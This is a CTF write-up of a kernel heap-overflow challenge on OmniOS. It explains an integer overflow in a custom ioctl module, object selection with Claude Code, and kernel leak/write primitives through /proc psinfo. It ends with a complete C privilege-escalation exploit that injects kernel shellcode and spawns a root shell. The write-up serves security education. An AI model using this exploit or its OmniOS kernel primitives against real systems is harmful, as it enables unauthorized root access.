---
title: "[DawgCTF 2026] Warmth"
date: 2026-05-09 08:30:25
tags:
categories: [Security, CTF]
---

## Overview

This was, to the best of my knowledge, the first kernel exploit challenge targeting the UNIX kerne — specifically [OmniOS](https://omnios.org/) — rather than Linux or Windows. The organizers provided only the vulnerable module source code, so I had to scaffold the debugging environment myself, which was challenging but ultimately fun. Because the time budget was tight, I used Claude Code aggressively, and it was effective for both exploit writing and debugging. That experience shaped how I think about **using LLM agents in a structured, disciplined way** to maximize productivity in security research.

[<i class="fa-solid fa-file"></i> cope.c](/uploads/dawgctf2026-warmth/cope.c)
[<i class="fa-solid fa-file"></i> cope.h](/uploads/dawgctf2026-warmth/cope.h)

## What is OmniOS?

![1.png](/images/dawgctf2026-warmth/1.png)

OmniOS is a distribution based on the illumos kernel, a fork of OpenSolaris, which in turn derives from UNIX System V - not Linux. Some server maintainers in the community have a high opinion of OmniOS because it provides free support for Solaris technologies such as ZFS and the bhyve hypervisor. For exploit writers, probably the most interesting feature is its **Modular Debugger (MDB)**, which enables **in-vivo debugging** of a live Solaris kernel. I used it extensively with Claude to debug the solution.

## Vulnerability

The provided `cope.c` module exposes an IOCTL command, `COPEIOC_COPE`, which copies a user payload into a kernel buffer. When this command is invoked, the `cope_do_cope` function calculates `allocsz`, `ncopy`, and `copysz` from the user-supplied integer argument `ioc.ci_ncope`. Here, `sizeof (cope_t)` is 12 and `COPE_BATCH_MAX` is 30, so the maximum `copysz` is 360.

```c
static int
cope_do_cope(cope_state_t *state, intptr_t arg, int md)
{
        cope_ioc_t ioc;
        uint32_t allocsz;
        uint32_t ncopy;
        size_t copysz;
        uint32_t i;
        int err;

        if ((err = cope_copyin_ioc(arg, md, &ioc)) != 0)
                return (err);

        if (ioc.ci_ncope == 0)
                return (0);

        allocsz = ioc.ci_ncope * sizeof (cope_t);
        ncopy = MIN(ioc.ci_ncope, (uint32_t)COPE_BATCH_MAX);
        copysz = (size_t)ncopy * sizeof (cope_t);

        err = cope_ensure_buf(state, allocsz);
        if (err != 0)
                goto out;

        if (ddi_copyin(ioc.ci_copes, state->cps_buf, copysz, md) != 0) {
                err = EFAULT;
                goto out;
        }

        for (i = 0; i < ncopy; i++)
                state->cps_buf[i].co_id = cope_next_id++;
```

Next, the kernel buffer is allocated by the `cope_ensure_buf` function. `sizeof (*newhdr)` is also 12, so the allocated buffer size is `allocsz + 12` bytes. The buffer pointer is assigned to `state->cps_buf`, where `copysz` bytes of user data are copied via the `ddi_copyin` function, which is analogous to `copy_from_user` in the Linux kernel.

```c
static int
cope_ensure_buf(cope_state_t *state, size_t want)
{
        ...
        newhdr = kmem_alloc(sizeof (*newhdr) + want, KM_SLEEP);
        newhdr->cbh_cookie = cookie;
        newhdr->cbh_pad = 0;
        ...
        state->cps_buf = (cope_t *)(newhdr + 1);
        state->cps_alloc = want;
```

However, because `allocsz` is a `uint32_t` calculated by multiplying the user-controlled `ioc.ci_ncope` by 12, we can make it smaller than `copysz`, whose maximum is 360, by providing a very large `ioc.ci_ncope`. For example, suppose `ioc.ci_ncope` is 1073741828. Then,

$$
\begin{align*}
\text{allocsz} &= (1073741828 \times 12) \bmod 2^{32} = 48 \\
\text{ncopy} &= \min(1073741828, 30) = 30 \\
\text{copysz} &= 30 \times 12 = 360
\end{align*}
$$

This produces a kernel heap overflow into a kernel buffer of size $48 + 12 = 60$ bytes. OmniOS uses the Slab allocator for small kernel memory allocations, which differs from SLUB in Linux; the original Slab allocator is now obsolete in Linux. In this example, the object lands in the `kmem_cache_60` cache.

## Exploit Plan

Because the module lets us allocate a vulnerable buffer of arbitrary size and trigger a heap overflow with controlled content, my first, very naive thought was that we might be able to overwrite the credential structure, `struct cred`. Unfortunately, it is allocated from a dedicated cache, `cred_cache`, rather than a generic cache such as `kmem_cache_*`.

```c
// /usr/src/uts/common/os/cred.c:245
/*
 * Allocate (nearly) uninitialized cred_t.
 */
static cred_t *
cralloc_flags(int flgs)
{
	cred_t *cr = kmem_cache_alloc(cred_cache, flgs);
```

Given this, the only way to achieve a credential overwrite with this heap overflow vulnerability would be to use a cross-cache overflow attack, making pages from `kmem_cache_*` and `cred_cache` adjacent. This would require significant engineering for heap grooming at the page allocator level, and there are no clear algorithms or established best practices for this even in Linux kernel research. So I quickly gave up on this approach.

The next step I tried was finding promising objects in generic caches. Thanks to the [lineage](https://github.com/xairy/linux-kernel-exploitation#exploitation) of excellent Linux kernel work, there are already some **standard criteria** for exploit-friendly objects, such as:

* Should be allocatable from userland (of course)
* Should have interesting fields, such as:
  * function pointer or table
  * pointer used for reads and writes
  * doubly linked list head
  * and more
* Optionally, should not allocate other objects in the same cache
  * this helps with heap grooming

However, since I had no background in the OmniOS kernel (or UNIX), searching for the needle object in the haystack was painful and almost impossible to do within my time budget. I considered finding such objects with something like CodeQL, following prior work, but then another thought suddenly hit my mind.

> **Why can't we make LLM agents do the research for us?**

I quickly instructed Claude Code to analyze the heap overflow characteristics like this:

> You are solving a CTF challenge.
> Read the vulnerable kernel module `cope.c`. Then discuss how heap overflow occurs in this module with technical details.

Then I asked it to search for target objects:

> Search for the best target object to exploit this heap overflow.
> The object **must** satisfy the following properties:
> ```
> 1. Allocatable from userland via a system call
> 2. Allocated in a generic cache, `kmem_cache_*`, not a dedicated cache
> 3. Should have at least one of the following fields:
>    * Function pointer or table
>    * Pointer used for reads and writes
>    * ...
> ```
> List all objects with:
> ```
> * Allocating system call
> * Freeing system call
> * Why you picked this object
> ```
> Then recommend one and explain why. Justify your selection.

Surprisingly, Claude Code identified an interesting object, `ctmpl_device`, in the `kmem_cache_60` cache within five minutes. This object contains a function-table pointer, `ctmpl_ops`, at offset 8. Because the prompt also instructed the model to **refer to** the corresponding system calls, Claude reported both the allocation system call and the triggering system calls that invoke each function.

```c
struct ctmpl_device {
	ct_template_t	ctd_ctmpl;
	uint_t		ctd_aset;
	uint_t		ctd_noneg;
	char		*ctd_minor;
};

/*
 * Contract template ops vector
 */
typedef struct ctmplops {
	struct ct_template	*(*ctop_dup)(struct ct_template *);
	void		(*ctop_free)(struct ct_template *);
	int		(*ctop_set)(struct ct_template *, ct_kparam_t *,
			const cred_t *);
	int		(*ctop_get)(struct ct_template *, ct_kparam_t *);
	int		(*ctop_create)(struct ct_template *, ctid_t *);
	uint_t		allevents;
} ctmplops_t;

/*
 * Contract template
 */
typedef struct ct_template {
	kmutex_t	ctmpl_lock;
	ctmplops_t	*ctmpl_ops;
	...
} ct_template_t;
```

## Privilege Escalation

Now we have a plan for turning this heap overflow into control flow hijacking, but it is only partially concrete. Because the target object (`ctmpl_device`) stores a function table pointer rather than a direct function pointer, we need to establish at least three things:

1. Where to forge the fake function table
2. How to write the fake function table there
3. What to do after hijacking control flow

Since rudimentary mitigations such as SMEP, SMAP, and KASLR were all enabled, I expected each target to require significant research time, since bypassing these mitigations on Linux is not easy. However, my jaw dropped when Claude reported the following.

### 1. Heap Leak as a Service

In OmniOS, reading `/proc/<pid>/psinfo` turned out to give us the `proc_t` address directly. This is the process descriptor for the current process in the kernel heap.

```c
/*
 * Return information used by ps(1).
 */
void
prgetpsinfo(proc_t *p, psinfo_t *psp)
{
    ...
    psp->pr_addr = (uintptr_t)prgetpsaddr(p);

/*
 * Return the "addr" field for pr_addr in prpsinfo_t.
 * This is a vestige of the past, so whatever we return is OK.
 */
caddr_t
prgetpsaddr(proc_t *p)
{
	return ((caddr_t)p);
}
```

### 2. Heap Write as a Service

The leaked `proc_t` contains the `p_cred` and `p_user` fields. `p_cred` is a pointer to the corresponding credential structure, `cred`, while `p_user` is user information embedded directly in `proc_t`.

```c
/*
 * One structure allocated per active process.  It contains all
 * data needed about the process while the process may be swapped
 * out.  Other per-process data (user.h) is also inside the proc structure.
 * Lightweight-process data (lwp.h) and the kernel stack may be swapped out.
 */
typedef struct	proc {
    ...
    struct	cred	*p_cred;	/* process credentials */
    ...
    /*
     * The user structure
     */
    struct user p_user;		/* (see sys/user.h) */
} proc_t;

/*
 * The user structure; one allocated per process.  Contains all the
 * per-process data that doesn't need to be referenced while the
 * process is swapped.
 */
typedef	struct	user {
    ...		/* lbolt at process start */
    char	u_comm[MAXCOMLEN + 1];	/* executable file name from exec */
    char	u_psargs[PSARGSZ];	/* arguments from exec */
    int	u_argc;			/* value of argc passed to main() */
    uintptr_t u_argv;		/* value of argv passed to main() */
    ...
} user_t;
```

The stranger part is that we can even write to `/proc/<pid>/psinfo`, which results in a write to `p_user.u_psargs` in the current process’s `proc_t`. The file mode was 0644, meaning it was writable by the owner, and there was no privilege or capability check beyond that.

```c
static int
pr_write_psinfo_psargs(prnode_t *pnp, uio_t *uiop)
{
	char psargs[PRARGSZ];
	...
	if ((error = uiomove(psargs, PRARGSZ, UIO_WRITE, uiop)) != 0)
		return (error);

	psargs[PRARGSZ - 1] = '\0';

	if ((error = prlock(pnp, ZNO)) != 0)
		return (error);

	bcopy(psargs, pnp->pr_common->prc_proc->p_user.u_psargs, PRARGSZ);
  
```

Now we have a **write-what** primitive at a known, writable kernel heap address. If this were a Linux kernel exploit, the natural next step would be something like placing a ROP chain in the kernel heap. However...

### 3. Heap Segment is Executable

The kernel heap is mapped RWX (`PROT_ALL & ~PROT_USER`) in `segkmem.c`. This is the strangest thing I found in this kernel. It means we don't need ROP at all. We can load **shellcode** into the kernel heap and execute it, as long as we can redirect control flow there.

```c
/*
 * Allocate pages to back the virtual address range [addr, addr + size).
 * If addr is NULL, allocate the virtual address space as well.
 */
void *
segkmem_xalloc(vmem_t *vmp, void *inaddr, size_t size, int vmflag, uint_t attr,
    page_t *(*page_create_func)(void *, size_t, int, void *), void *pcarg)
{
	...
	while (ppl != NULL) {
		...
		hat_memload(kas.a_hat, (caddr_t)(uintptr_t)pp->p_offset, pp,
		    (PROT_ALL & ~PROT_USER) | HAT_NOSYNC | attr,
		    HAT_LOAD_LOCK | allocflag);
		pp->p_lckcnt = 1;
```

With all of this in place, the final privilege escalation sequence was as follows:

1. Fork a child process and leak each heap address.
    * We now have two known writable addresses.
2. Write the fake function table and trampoline shellcode into the parent's `u_psargs`.
3. Write the main shellcode into the child's `u_psargs`.
    * It clears `cr_uid` and `cr_gid` in `curproc->cred`.
    * Because `curproc` is leaked beforehand, the shellcode is composed just-in-time (JIT).
    * Finally, the shellcode returns to userland.
4. Spray thousands of `ctmpl_device` objects, free one, and reclaim it with the vulnerable buffer.
    * At this point, the function table pointers of adjacent `ctmpl_device` objects are corrupted by the heap overflow.
5. Trigger control flow hijacking.
    * The fake function table redirects control flow to the trampoline.
    * The trampoline shellcode redirects control flow to the main shellcode.
    * The main shellcode zeroes `curproc->cred` and returns to userland.

The final solution code that worked in my VM is shown below. After mechanically adjusting the offsets for the server binary, it dropped a root shell.

<details>
<summary><strong>Solution</strong></summary>
```c
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <procfs.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/contract/device.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/processor.h>
#include <sys/procset.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* ---- gadgets (runtime VAs from /platform/i86pc/kernel/amd64/unix) ----- */
/* Verified with mdb ::dis on the practice VM (omnios-master-4c3af994d63). */
/* No KASLR — section VAs == runtime VAs.                                  */

#define G_RET 0xfffffffffb888270ULL         /* ret (c3)               */
#define G_XOR_EAX_RET 0xfffffffffb88826eULL /* xor eax,eax; ret       */
#define G_POP_RDI_RET 0xfffffffffb888c5dULL /* pop rdi; ret            */
#define G_POP_RSI_POP_RBP_RET                                                  \
    0xfffffffffb8c2990ULL                      /* pop rsi; pop rbp; ret        \
                                                */
#define G_POP_RAX_RET 0xfffffffffb887fa1ULL    /* pop rax; ret            */
#define G_POP_RCX_RET 0xfffffffffb8b3cb3ULL    /* pop rcx; ret            */
#define G_POP_RBP_RET 0xfffffffffb8de6ebULL    /* pop rbp; ret            */
#define G_WRITE 0xfffffffffb87be7fULL          /* mov [rdi],rsi; ret      */
#define G_PIVOT_RAX 0xfffffffffb888c59ULL      /* mov rsp,rax; pop; pop; ret */
#define G_LEAVE_RET 0xfffffffffb8de763ULL      /* leave; ret              */
#define G_IRETQ 0xfffffffffb802350ULL          /* iretq                   */
#define G_SWAPGS_IRETQ 0xfffffffffb8023caULL   /* swapgs; iretq           */
#define G_SWAPGS_SYSRETQ 0xfffffffffb802064ULL /* swapgs; sysretq         */

/* Symbol addresses (practice VM — re-resolve from /dev/ksyms on target) */
#define SYM_KCRED 0xfffffffffbcccd50ULL
#define SYM_CTMPL_DEV_OPS 0xfffffffffbcbe2a0ULL

/* Struct offsets (invariant — from kernel source / mdb ::offsetof) */
#define OFF_PROC_PCRED 0x20    /* offsetof(proc_t, p_cred)            */
#define OFF_PROC_PUSER 0x6a8   /* offsetof(proc_t, p_user)            */
#define OFF_USER_UPSARGS 0x201 /* offsetof(struct user, u_psargs)     */
#define OFF_FAKE_OPS (OFF_PROC_PUSER + OFF_USER_UPSARGS) /* 0x8a9  */
#define OFF_CTMPL_OPS 8      /* offsetof(ct_template_t, ctmpl_ops)  */
#define OFF_CTOP_CREATE 0x20 /* offsetof(ctmplops_t, ctop_create)   */
#define OFF_CRED_UID 4       /* offsetof(cred_t, cr_uid)            */

/* ---- vendored sys/cope.h ---------------------------------------------- */
#define COPEIOC (('c' << 24) | ('o' << 16) | ('p' << 8) | 'e')
#define COPEIOC_COPE (COPEIOC | 1)
#define COPEIOC_MALD (COPEIOC | 2)
#define COPE_BATCH_MAX 30

typedef struct cope {
    uint8_t co_data[8];
    uint32_t co_id;
} __attribute__((packed)) cope_t;

typedef struct cope_ioc {
    cope_t *ci_copes;
    uint32_t ci_ncope;
} cope_ioc_t;

/* ---- constants -------------------------------------------------------- */
#define TEMPLATE_PATH "/system/contract/device/template"
#define N_SPRAY 20000
#define MAGIC_NCOPE 1073741828u
#define NCOPY 30
#define COPYSZ (NCOPY * sizeof(cope_t)) /* 360 */
#define V0_BASE 52
#define N_GROOM 3
#define GROOM_SPACING 200

#define CTFS_PREFIX ('c' << 24 | 't' << 16)
#define CT_TCREATE (CTFS_PREFIX | ('t' << 8) | 2)

/* ---- globals for the landing path ------------------------------------- */

static void *g_landing_stack;
#define LANDING_STACK_SIZE (64 * 1024)

static volatile int g_landed = 0;

/*
 * Shared between main() and landing(): the spray fd table and the list
 * of corrupted fds that must NEVER be closed (mutex_destroy panics).
 */
static int g_spray_fds[N_SPRAY + 128];
static int g_nsprayed;
#define N_BAD_FDS 5
static int g_bad_fds[N_BAD_FDS]; /* victims 0-4 fd numbers */
static int g_nbad;

/* ---- landing function (runs in userland after sysretq) ---------------- */

static int is_bad_fd(int fd) {
    for (int i = 0; i < g_nbad; i++)
        if (g_bad_fds[i] == fd)
            return (1);
    return (0);
}

static void __attribute__((noreturn)) landing(void) {
    g_landed = 1;

    uid_t uid = getuid();
    uid_t euid = geteuid();
    char buf[256];
    int n;

    n = snprintf(buf, sizeof(buf), "uid: %d euid: %d\n", uid, euid);
    write(1, buf, n);

    /*
     * Close every fd ≥ 3 EXCEPT the corrupted template fds.
     *
     * Victims 0,3: byte0=0xff, ctop_free=G_RET → safe to close
     *   (mutex_destroy takes the spin-mutex destroy branch).
     * Victims 1,2,4: byte0=co_id garbage → mutex_destroy panics.
     *
     * We skip ALL 5 victims for safety margin.  Leaving 5 leaked
     * fds is harmless; the shell inherits them but never touches
     * them.  When the shell exits the kernel will panic on the 3
     * truly bad ones, but by then we've captured the flag.
     */
    int max_fd = g_nsprayed + 20;
    for (int fd = 3; fd < max_fd; fd++) {
        if (is_bad_fd(fd))
            continue;
        close(fd); /* safe for uncorrupted templates */
    }

    /*
     * exec /bin/sh — stdin/stdout/stderr remain connected to
     * whatever the parent process had (terminal via SSH, or
     * pipe/pty from the harness).
     */
    execl("/bin/sh", "sh", NULL);

    /* If exec failed, pause forever (never exit). */
    for (;;)
        pause();
}

/* ---- helpers ---------------------------------------------------------- */

/*
 * Read pr_addr (= curproc kernel pointer) from /proc/<pid>/psinfo.
 */
static uintptr_t get_proc_addr(pid_t pid) {
    char path[64];
    psinfo_t ps;
    int fd;

    snprintf(path, sizeof(path), "/proc/%d/psinfo", (int) pid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return (0);
    if (pread(fd, &ps, sizeof(ps), 0) != sizeof(ps)) {
        close(fd);
        return (0);
    }
    close(fd);
    return ((uintptr_t) ps.pr_addr);
}

/*
 * Write arbitrary bytes to /proc/<pid>/psinfo's pr_psargs.
 */
static int plant_psargs(pid_t pid, const void *buf, size_t len) {
    char path[64];
    int fd;
    off_t off = (off_t) offsetof(psinfo_t, pr_psargs);

    snprintf(path, sizeof(path), "/proc/%d/psinfo", (int) pid);
    fd = open(path, O_RDWR);
    if (fd < 0)
        return (-1);
    if (pwrite(fd, buf, len, off) != (ssize_t) len) {
        close(fd);
        return (-1);
    }
    close(fd);
    return (0);
}

/*
 * Build the OOB payload: for each victim slot, set byte0=0xff (mutex),
 * [8..16)=fake_ops pointer, [56..64)=NULL ctd_minor.
 */
static void build_oob_payload(cope_t *buf, uint64_t fake_ops) {
    unsigned char *p = (unsigned char *) buf;
    int v, k, end;

    memset(p, 0, COPYSZ);
    for (v = 0; v < 5; v++) {
        int base = V0_BASE + 64 * v;
        end = 64;
        if (base + end > (int) COPYSZ)
            end = (int) COPYSZ - base;
        if (end <= 0)
            break;

        p[base + 0] = 0xff;
        for (k = 8; k < 16 && k < end; k++)
            p[base + k] = (fake_ops >> ((k - 8) * 8)) & 0xff;
    }
}

/* ---- main ------------------------------------------------------------- */

int main(void) {
    int nsprayed = 0;
    int cope_fd, i;
    cope_t oob_payload[NCOPY];
    int groom_idx[N_GROOM];
    int last_groom;
    uintptr_t myproc, child_proc, fake_ops;
    pid_t child_pid;

    setbuf(stdout, NULL);

    /*
     * Save user CS/SS segment selectors — needed by sysretq to
     * restore the correct segments on kernel→user transition.
     */
    uint64_t user_cs, user_ss;
    __asm__ volatile("mov %%cs, %0" : "=r"(user_cs));
    __asm__ volatile("mov %%ss, %0" : "=r"(user_ss));

    /*
     * Allocate a dedicated landing stack for the post-exploit
     * userland return.  The kernel shellcode sets rsp to this
     * before sysretq, so landing() runs on a clean stack.
     */
    g_landing_stack = mmap(
        NULL, LANDING_STACK_SIZE, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANON, -1, 0
    );
    if (g_landing_stack == MAP_FAILED) {
        perror("mmap");
        return (1);
    }
    /* Stack grows down; point to the top, 16-byte aligned */
    uintptr_t landing_rsp =
        ((uintptr_t) g_landing_stack + LANDING_STACK_SIZE) & ~0xFULL;

    /*
     * Leak curproc kernel address from /proc/self/psinfo pr_addr.
     * fake_ops = myproc + 0x8a9 = &curproc->p_user.u_psargs,
     * which is where we plant the forged vtable.
     */
    myproc = get_proc_addr(getpid());
    if (!myproc) {
        fprintf(stderr, "get myproc failed\n");
        return (1);
    }
    fake_ops = myproc + OFF_FAKE_OPS;
    printf("myproc: 0x%lx\n", (unsigned long) myproc);
    printf("fake_ops: 0x%lx\n", (unsigned long) fake_ops);

    /*
     * Fork a child that pause()s forever.  Its proc_t provides a
     * second u_psargs buffer (79 bytes) for the kernel shellcode,
     * since the parent's u_psargs is occupied by the forged vtable.
     */
    child_pid = fork();
    if (child_pid < 0) {
        perror("fork");
        return (1);
    }
    if (child_pid == 0) {
        for (;;)
            pause();
    }
    usleep(50000);

    child_proc = get_proc_addr(child_pid);
    if (!child_proc) {
        fprintf(stderr, "get child_proc failed\n");
        kill(child_pid, SIGKILL);
        return (1);
    }
    printf("child_proc: 0x%lx\n", (unsigned long) child_proc);

    /* ---- build & plant CHILD's u_psargs: kernel shellcode ---- */
    /*
     * Shellcode (68 bytes): zero cr_uid/cr_gid/cr_ruid/cr_rgid/
     * cr_suid/cr_sgid in the EXISTING credential, then swapgs;
     * sysretq back to userland.
     *
     * We do NOT replace p_cred with &kcred — kcred is a minimal
     * kernel credential with NULL cr_ksid, and any cred operation
     * (setuid, crdup in exec, etc.) would NULL-deref and panic.
     * Instead, we zero the uid/gid fields in the existing cred,
     * preserving its valid SID pointers and other internal state.
     *
     *   movabs rdi, <myproc + 0x20>     ; 10  load &p_cred
     *   mov    rdi, [rdi]                ; 3   rdi = cred_t*
     *   xor    eax, eax                  ; 2   eax = 0
     *   mov    [rdi+4], eax              ; 3   cr_uid = 0
     *   mov    [rdi+8], eax              ; 3   cr_gid = 0
     *   mov    [rdi+12], eax             ; 3   cr_ruid = 0
     *   mov    [rdi+16], eax             ; 3   cr_rgid = 0
     *   mov    [rdi+20], eax             ; 3   cr_suid = 0
     *   mov    [rdi+24], eax             ; 3   cr_sgid = 0
     *   movabs rcx, <landing>            ; 10  sysretq RIP
     *   mov    r11d, 0x202               ; 6   RFLAGS (IF)
     *   movabs rax, <landing_rsp>        ; 10  user stack
     *   mov    rsp, rax                  ; 3
     *   swapgs                           ; 3
     *   sysretq                          ; 3   total: 68 bytes
     */
    {
        unsigned char sc[PRARGSZ];
        int off = 0;
        uintptr_t pcred_addr = myproc + OFF_PROC_PCRED;
        uintptr_t ret_rip = (uintptr_t) landing;
        uintptr_t ret_rsp = landing_rsp;

        memset(sc, 0x90, sizeof(sc)); /* NOP sled for safety */

        /* movabs rdi, pcred_addr (48 bf imm64) */
        sc[off++] = 0x48;
        sc[off++] = 0xbf;
        memcpy(&sc[off], &pcred_addr, 8);
        off += 8;

        /* mov rdi, [rdi] (48 8b 3f) — load cred_t* */
        sc[off++] = 0x48;
        sc[off++] = 0x8b;
        sc[off++] = 0x3f;

        /* xor eax, eax (31 c0) */
        sc[off++] = 0x31;
        sc[off++] = 0xc0;

        /* mov [rdi+4], eax  — cr_uid  (89 47 04) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x04;
        /* mov [rdi+8], eax  — cr_gid  (89 47 08) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x08;
        /* mov [rdi+12], eax — cr_ruid (89 47 0c) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x0c;
        /* mov [rdi+16], eax — cr_rgid (89 47 10) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x10;
        /* mov [rdi+20], eax — cr_suid (89 47 14) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x14;
        /* mov [rdi+24], eax — cr_sgid (89 47 18) */
        sc[off++] = 0x89;
        sc[off++] = 0x47;
        sc[off++] = 0x18;

        /* movabs rcx, ret_rip (48 b9 imm64) */
        sc[off++] = 0x48;
        sc[off++] = 0xb9;
        memcpy(&sc[off], &ret_rip, 8);
        off += 8;

        /* mov r11d, 0x202 (41 bb 02 02 00 00) */
        sc[off++] = 0x41;
        sc[off++] = 0xbb;
        sc[off++] = 0x02;
        sc[off++] = 0x02;
        sc[off++] = 0x00;
        sc[off++] = 0x00;

        /* movabs rax, ret_rsp (48 b8 imm64) */
        sc[off++] = 0x48;
        sc[off++] = 0xb8;
        memcpy(&sc[off], &ret_rsp, 8);
        off += 8;

        /* mov rsp, rax (48 89 c4) */
        sc[off++] = 0x48;
        sc[off++] = 0x89;
        sc[off++] = 0xc4;

        /* swapgs (0f 01 f8) */
        sc[off++] = 0x0f;
        sc[off++] = 0x01;
        sc[off++] = 0xf8;

        /* sysretq (48 0f 07) */
        sc[off++] = 0x48;
        sc[off++] = 0x0f;
        sc[off++] = 0x07;

        if (off > PRARGSZ - 1) {
            fprintf(stderr, "shellcode too large: %d\n", off);
            kill(child_pid, SIGKILL);
            return (1);
        }

        if (plant_psargs(child_pid, sc, PRARGSZ) != 0) {
            fprintf(stderr, "plant child psargs failed\n");
            kill(child_pid, SIGKILL);
            return (1);
        }
    }

    /* ---- build & plant PARENT's u_psargs: vtable + trampoline ---- */
    /*
     * Layout:
     *   [0..8)   ctop_dup   = G_RET
     *   [8..16)  ctop_free  = G_RET
     *   [16..24) ctop_set   = G_RET
     *   [24..32) ctop_get   = G_RET
     *   [32..40) ctop_create = fake_ops + 48 (= myproc + 0x8a9 + 48)
     *            (address of the trampoline below)
     *   [40..48) allevents  = 0 (padding, never read)
     *   [48..60) trampoline:
     *            movabs rax, <child_proc + 0x8a9>  (10 bytes)
     *            jmp rax                            (2 bytes)
     *   [60..79) unused
     */
    {
        unsigned char psargs[PRARGSZ];
        uint64_t *p = (uint64_t *) psargs;
        uintptr_t trampoline_addr = fake_ops + 48;
        uintptr_t child_sc_addr = child_proc + OFF_FAKE_OPS;

        memset(psargs, 0, sizeof(psargs));
        p[0] = G_RET;           /* ctop_dup */
        p[1] = G_RET;           /* ctop_free */
        p[2] = G_RET;           /* ctop_set */
        p[3] = G_RET;           /* ctop_get */
        p[4] = trampoline_addr; /* ctop_create → trampoline */
        p[5] = 0;               /* allevents */

        /* Trampoline at offset 48:
         *   movabs rax, child_sc_addr (48 b8 + imm64 = 10 bytes)
         *   jmp rax                   (ff e0 = 2 bytes)
         */
        int toff = 48;
        psargs[toff++] = 0x48;
        psargs[toff++] = 0xb8;
        memcpy(&psargs[toff], &child_sc_addr, 8);
        toff += 8;
        psargs[toff++] = 0xff;
        psargs[toff++] = 0xe0;

        if (plant_psargs(getpid(), psargs, PRARGSZ) != 0) {
            fprintf(stderr, "plant parent psargs failed\n");
            kill(child_pid, SIGKILL);
            return (1);
        }
    }

    /*
     * ---- Spray + Groom + OOB ----
     *
     * Pin to CPU 0 so all kmem magazine operations hit the same
     * per-CPU cache, making the LIFO pop after groom deterministic.
     *
     * Open /dev/cope BEFORE the spray — cope_open traverses VFS
     * which does transient kmem_alloc_64 ops that would consume
     * groomed holes if done after.
     *
     * Spray 20K ctmpl_device_t objects (64 bytes each) into
     * kmem_alloc_64, then close 3 from interior slab pages to
     * create holes.  The cope ioctl's kmem_alloc(60) pops one
     * of these holes, landing adjacent to live templates.
     *
     * The OOB payload overwrites 5 adjacent victim chunks.
     * Only victims 0 and 3 have safe co_id store patterns
     * (critical fields byte0, ctmpl_ops, ctd_minor survive).
     */
    (void) processor_bind(P_PID, P_MYID, 0, NULL);

    cope_fd = open("/dev/cope", O_RDWR);
    if (cope_fd < 0) {
        fprintf(stderr, "open /dev/cope: %s\n", strerror(errno));
        kill(child_pid, SIGKILL);
        return (1);
    }

    for (i = 0; i < N_SPRAY; i++) {
        int fd = open(TEMPLATE_PATH, O_RDWR);
        if (fd < 0)
            break;
        g_spray_fds[i] = fd;
        nsprayed++;
    }

    /* Groom: close 3 from interior pages, spaced apart */
    {
        int base = nsprayed / 2;
        for (i = 0; i < N_GROOM; i++) {
            groom_idx[i] = base + i * GROOM_SPACING;
            close(g_spray_fds[groom_idx[i]]);
            g_spray_fds[groom_idx[i]] = -1;
        }
    }
    last_groom = groom_idx[N_GROOM - 1];

    /* Fire the integer-overflow OOB ioctl */
    build_oob_payload(oob_payload, fake_ops);
    {
        cope_ioc_t ioc;
        ioc.ci_copes = oob_payload;
        ioc.ci_ncope = MAGIC_NCOPE;
        if (ioctl(cope_fd, COPEIOC_COPE, &ioc) != 0) {
            fprintf(stderr, "OOB ioctl failed: %s\n", strerror(errno));
            goto pause_forever;
        }
    }
    close(cope_fd);

    /*
     * Record the corrupted victim fds so landing() skips them
     * during cleanup.  Closing a corrupted template triggers
     * mutex_enter on a forged lock → deadlock/panic.
     */
    g_nsprayed = nsprayed;
    g_nbad = 0;
    for (i = 1; i <= 5 && i <= last_groom; i++) {
        int idx = last_groom - i;
        if (idx >= 0 && idx < nsprayed && g_spray_fds[idx] >= 0)
            g_bad_fds[g_nbad++] = g_spray_fds[idx];
    }

    /*
     * ---- Trigger ----
     *
     * CT_TCREATE on the corrupted template calls:
     *   template->ctmpl_ops->ctop_create(template, &ctid)
     * which follows our forged vtable → trampoline → shellcode.
     *
     * If the shellcode succeeds, execution never returns here —
     * sysretq lands in landing().  If it returns, the OOB missed
     * (wrong slab neighbor); try victim 3 as fallback.
     */
    {
        int v0_idx = last_groom - 1;
        int v3_idx = last_groom - 4;

        fflush(stdout);
        if (v0_idx >= 0 && v0_idx < nsprayed && g_spray_fds[v0_idx] >= 0) {
            ioctl(g_spray_fds[v0_idx], CT_TCREATE, 0);
        }

        if (v3_idx >= 0 && v3_idx < nsprayed && g_spray_fds[v3_idx] >= 0) {
            ioctl(g_spray_fds[v3_idx], CT_TCREATE, 0);
        }

        fprintf(stderr, "trigger failed: no victim hit\n");
    }

pause_forever:
    /* Never exit — fd cleanup on corrupted templates panics */
    fflush(stdout);
    for (;;)
        pause();
}
```
</details>

![2.png](/images/dawgctf2026-warmth/2.png)